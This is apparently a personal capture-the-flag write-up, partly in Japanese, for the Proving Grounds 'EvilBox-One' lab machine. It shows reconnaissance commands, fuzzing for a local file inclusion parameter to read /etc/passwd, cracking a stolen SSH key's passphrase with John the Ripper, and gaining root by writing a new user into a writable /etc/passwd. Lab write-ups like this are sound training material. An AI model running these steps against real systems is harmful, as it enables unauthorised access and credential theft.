---
title: EvilBox-One
parent: Proving Grounds Play
grand_parent: Writeups
nav_order:
---
---
# Reconnaissance

```zsh
sudo nmap -Pn -p- --open 192.168.202.212
```

![[Pasted image 20260924050653.png]]

```zsh
sudo nmap -Pn -p22,80 -sVC 192.168.202.212
```

![[Pasted image 20260924050753.png]]

### HTTP 80

```zsh
feroxbuster \ 
-u http://192.168.202.212/ \       
-w /usr/share/wordlists/dirb/big.txt \
-x html,git,php,txt,bak,zip,old \
-d 2 \ 
-t 25 \
-r \
--random-agent \
-C 403,404 \
-o ferox.txt
```

![[Pasted image 20260924053217.png]]

robots.txt

![[Pasted image 20260924051752.png]]

## LFIの脆弱性があるか調査

```zsh
ffuf -u 'http://192.168.202.212/secret/evil.php?FUZZ=/etc/passwd' -w /usr/share/wordlists/seclists/Discovery/Web-Content/burp-parameter-names.txt -fs 0
```

![[Pasted image 20260924054512.png]]

command

http://192.168.202.212/secret/evil.php?command=/etc/passwd

![[Pasted image 20260924054616.png]]

---

# Initial Access

curlでもLFIを実行できることを確認

```zsh
curl http://192.168.202.212/secret/evil.php?command=/etc/passwd
```

![[Pasted image 20260924055706.png]]

mowreeというユーザを確認

```zsh
cat mowree_id_rsa
```

![[Pasted image 20260924055847.png]]

```zsh
cat mowree_id_rsa
```

![[Pasted image 20260924055940.png]]

```zsh
ssh2john mowree_id_rsa > mowree_hash
```

```zsh
cat mowree_hash
```

![[Pasted image 20260924061229.png]]

```zsh
john mowree_hash --wordlist=/usr/share/wordlists/rockyou.txt
```

![[Pasted image 20260924061315.png]]

※２回目なので出ない

```zsh
john --show mowree_hash 
```

![[Pasted image 20260924061302.png]]

unicorn

```zsh
ssh -i mowree_id_rsa mowree@192.168.202.212
```

![[Pasted image 20260924061442.png]]

![[Pasted image 20260924061503.png]]

---

# Privilege Escalation

```zsh
find / -type f -writable 2>/dev/null
```

![[Pasted image 20260924063125.png]]
![[Pasted image 20260924063100.png]]

![[Pasted image 20260924063156.png]]

新たな仮想ユーザを作成し、passwdファイルに書き込む

```zsh
openssl passwd 12345678
```

![[Pasted image 20260924063623.png]]

ID:evil
PW:12345678
を作成

![[Pasted image 20260924063659.png]]

![[Pasted image 20260924063743.png]]

<details markdown="1">
<summary>Walkthrough</summary>

```zsh

```

</details>